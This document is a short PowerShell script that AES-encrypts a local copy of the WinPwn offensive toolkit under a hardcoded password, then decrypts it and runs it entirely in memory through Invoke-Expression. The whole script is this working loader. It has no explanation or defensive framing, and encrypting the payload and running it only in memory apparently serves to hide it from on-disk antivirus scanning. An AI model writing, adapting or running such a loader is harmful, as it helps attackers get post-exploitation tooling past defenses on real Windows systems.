# Set variables
$FileToEncrypt = ".\Offline_WinPwn.ps1"   # File to encrypt
$EncryptedFile = ".\WinPwn_Encrypted.dat" # Output encrypted file
$Password = "Y2233ourStr12312ongP2131assword455247786"

# Function to derive key and IV from password
function Get-AesKeyIv {
    param ($Password)
    
    $Salt = New-Object byte[] 16
    [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($Salt)
    
    $KeyDerivation = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, 10000)
    $Key = $KeyDerivation.GetBytes(32)
    $IV = $KeyDerivation.GetBytes(16)

    return $Key, $IV, $Salt
}

# Function to encrypt a file
function Encrypt-File {
    param ($InputFile, $OutputFile, $Password)

    $Key, $IV, $Salt = Get-AesKeyIv -Password $Password

    $AES = [System.Security.Cryptography.AesManaged]::new()
    $AES.Key = $Key
    $AES.IV = $IV
    $AES.Padding = "PKCS7"

    $Encryptor = $AES.CreateEncryptor()
    $Bytes = [System.IO.File]::ReadAllBytes($InputFile)
    $Encrypted = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)

    # Save salt + encrypted data
    $FinalData = $Salt + $Encrypted
    [System.IO.File]::WriteAllBytes($OutputFile, $FinalData)

    Write-Host "[+] File encrypted: $OutputFile"
}

# Function to decrypt and execute PS1 in-memory
function Decrypt-RunPS1 {
    param ($EncryptedFile, $Password)

    $Data = [System.IO.File]::ReadAllBytes($EncryptedFile)

    # Extract salt
    $Salt = $Data[0..15]
    $Encrypted = $Data[16..($Data.Length-1)]

    # Re-derive key & IV
    $KeyDerivation = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, $Salt, 10000)
    $Key = $KeyDerivation.GetBytes(32)
    $IV = $KeyDerivation.GetBytes(16)

    $AES = [System.Security.Cryptography.AesManaged]::new()
    $AES.Key = $Key
    $AES.IV = $IV
    $AES.Padding = "PKCS7"

    $Decryptor = $AES.CreateDecryptor()
    $Decrypted = $Decryptor.TransformFinalBlock($Encrypted, 0, $Encrypted.Length)
    $DecryptedText = [System.Text.Encoding]::UTF8.GetString($Decrypted)

    # Execute script in memory
    Invoke-Expression $DecryptedText
    WinPwn  # Execute WinPwn immediately
}

# Encrypt file
Encrypt-File -InputFile $FileToEncrypt -OutputFile $EncryptedFile -Password $Password

# Decrypt and execute file
Decrypt-RunPS1 -EncryptedFile $EncryptedFile -Password $Password
